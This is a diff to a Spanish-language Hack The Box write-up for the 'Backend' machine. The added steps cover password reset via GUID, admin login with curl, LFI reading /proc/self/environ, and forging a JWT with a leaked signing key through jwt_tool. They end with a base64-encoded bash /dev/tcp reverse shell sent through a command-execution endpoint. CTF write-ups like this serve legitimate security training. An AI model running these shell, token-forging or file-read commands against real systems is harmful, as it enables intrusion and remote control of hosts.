@@ -18,12 +18,11 @@ pin: true
 >jwt_tool
 
 ### Reconocimiento:
-^reconocimiento
 
 El escaneo inicial revela un servicio web en el puerto 22,80 asociado al dominio `backend.htb`.
 
 ### Enumeración y explotación de vulnerabilidades:
-^enumeracion
+
 
 
 Esta maquina requiere a una enumeración exhaustiva 
@@ -86,3 +85,89 @@ La primera que hacemos es obtener la user flag
 
 
 ![Screenshot5](/assets/writeups/backend/5.png)
+
+
+La siguiente funcionalidad que llama la atencion es actualizar la contraseña donde introduciremos el guid del usuario que encontramos anteriormente + la nueva contraseña
+
+![Screenshot6](/assets/writeups/backend/6.png)
+
+
+![Screenshot7](/assets/writeups/backend/7.png)
+
+
+Obtenemos el token del administrador
+
+`curl "http://backend.htb/api/v1/user/login" -d "username=admin@htb.local&password=foo123"`
+
+Cambiamos el token establecido anteriormente en el match & replace de burpsuite
+
+Ahora tenemos acceso a nuevas funcionalidades, destacamos dos:
+
+- LFI en /api/v1/admin/file 
+- command execution en /api/v1/admin/exec donde es tener el campo **debug=true**
+
+
+![Screenshot8](/assets/writeups/backend/8.png)
+
+
+
+leemos el archiv **/proc/self/environ** el cual almacena las **variables de entorno** del proceso que lo está consultando
+
+
+![Screenshot9](/assets/writeups/backend/9.png)
+
+![Screenshot10](/assets/writeups/backend/10.png)
+
+
+Lo descargamos y formateamos 
+```
+curl file:///home/ari/Descargas/response_1769381983740.json | jq '.file' -r > main.py
+```
+
+![Screenshot11](/assets/writeups/backend/11.png)
+
+
+
+
+con **jwt_tool** añadimos el campo debug= true
+
+```
+python3 jwt_tool.py 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzcwMDg5NTY1LCJpYXQiOjE3NjkzOTgzNjUsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.GMdNhbWtHX9O-DaL89_0hYq_tCBpTrONPC4eBM7JBgo' -T -S hs256 -p 'SuperSecretSigningKey-HTB'
+```
+
+
+![Screenshot12](/assets/writeups/backend/12.png)
+
+![Screenshot13](/assets/writeups/backend/13.png)
+
+
+Ahora en el endpoint /api/v1/admin/exec/whoami podemos ejecutar comandos dentro del sistema. 
+Nos enviamos una reverse shell
+
+```
+echo -n 'bash -i >& /dev/tcp/10.10.15.135/443 0>&1' | base64 -w 0;echo
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xMzUvNDQzIDA+JjE=
+http://backend.htb/api/v1/admin/exec/echo%20YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xMzUvNDQzIDA+JjE=|base64%20-d|bash
+```
+
+![Screenshot14](/assets/writeups/backend/14.png)
+
+
+
+### Escalada de privilegios:
+
+
+La escalada de privilegios de esta maquina se basa simplemente en leer un .log
+
+![Screenshot9](/assets/writeups/backend/15.png)
+
+
+
+
+
+
+
+
+
+
+
